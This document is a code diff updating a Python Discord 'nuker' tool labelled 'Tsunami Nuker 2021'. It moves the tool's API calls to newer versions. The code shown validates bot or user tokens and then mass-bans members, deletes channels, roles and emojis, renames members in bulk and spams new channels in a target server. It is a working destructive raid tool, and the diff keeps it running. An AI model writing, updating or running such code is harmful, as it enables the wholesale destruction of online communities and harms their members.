@@ -21,14 +21,14 @@ def check():
     print('Validating Discord token...')
 
     # Try as bot token first
-    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': f'Bot {token}'})
+    r = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'Bot {token}'})
     print(f'Bot token attempt: Status {r.status_code}')
     if r.status_code == 200:
         print('Valid bot token detected')
         return "bot"
 
     # Try as user token
-    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': f'{token}'})
+    r = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'{token}'})
     print(f'User token attempt: Status {r.status_code}')
     if r.status_code == 200:
         print('Valid user token detected')
@@ -63,7 +63,7 @@ class Tsunami:
             payload = {
                 'reason': 'Tsunami Nuker 2021'
             }    
-            r = session.put(f'https://discord.com/api/v9/guilds/{guild}/bans/{user}', headers=headers, json=payload).result()
+            r = session.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{user}', headers=headers, json=payload).result()
             if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
                 break
@@ -95,7 +95,7 @@ class Tsunami:
             payload = {
                 'reason': 'Tsunami Nuker 2021'
             }    
-            r = session.put(f'https://discord.com/api/v9/guilds/{guild}/bans/{user}', headers=headers, json=payload).result()
+            r = session.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{user}', headers=headers, json=payload).result()
             if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
                 break
@@ -111,7 +111,7 @@ class Tsunami:
             payload = {
                 'reason': 'Tsunami Nuker 2021'
             }    
-            r = session.put(f'https://canary.discordapp.com/api/v8/guilds/{str(guild)}/bans/{str(user)}', headers=headers, json=payload).result()
+            r = session.put(f'https://canary.discordapp.com/api/v9/guilds/{str(guild)}/bans/{str(user)}', headers=headers, json=payload).result()
             if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY BANNED {user.strip()}{self.white}]{self.reset}')
                 break
@@ -143,7 +143,7 @@ class Tsunami:
             payload = {
                 'reason': 'Tsunami Nuker 2021'
             }        
-            r = session.delete(f'https://discord.com/api/v9/channels/{channel}', headers=headers, json=payload).result()
+            r = session.delete(f'https://discord.com/api/v10/channels/{channel}', headers=headers, json=payload).result()
             if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {channel.strip()}{self.white}]{self.reset}')
                 break
@@ -175,7 +175,7 @@ class Tsunami:
             payload = {
                 'reason': 'TSUNAMI NUKER 2021'
             }
-            r = session.delete(f'https://discord.com/api/v9/guilds/{guild}/roles/{role}', headers=headers, json=payload).result()
+            r = session.delete(f'https://discord.com/api/v10/guilds/{guild}/roles/{role}', headers=headers, json=payload).result()
             if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {role.strip()}{self.white}]{self.reset}')
                 break
@@ -191,7 +191,7 @@ class Tsunami:
             payload = {
                 'reason': 'TSUNAMI NUKER 2021'
             }
-            r = session.delete(f'https://discord.com/api/v9/guilds/{guild}/emojis/{emoji}', headers=headers, json=payload).result()
+            r = session.delete(f'https://discord.com/api/v10/guilds/{guild}/emojis/{emoji}', headers=headers, json=payload).result()
             if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY DELETED {emoji.strip()}{self.white}]{self.reset}')
                 break
@@ -207,7 +207,7 @@ class Tsunami:
             payload = {
                 'nick': name
             }
-            r = session.patch(f'https://discord.com/api/v9/guilds/{guild}/members/{user}', headers=headers, json=payload).result()
+            r = session.patch(f'https://discord.com/api/v10/guilds/{guild}/members/{user}', headers=headers, json=payload).result()
             if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY NICKNAMED {user.strip()}{self.white}]{self.reset}')
                 break
@@ -241,7 +241,7 @@ class Tsunami:
                 'name': name,
                 'type': 0
             }
-            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=payload)
+            r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/channels', headers=headers, json=payload)
             if r.status_code == 201 or r.status_code == 204 or r.status_code == 200:
                 print(f'{self.white}[{self.blue}SUCCESSFULLY CREATED {name}{self.white}]{self.reset}')
                 break
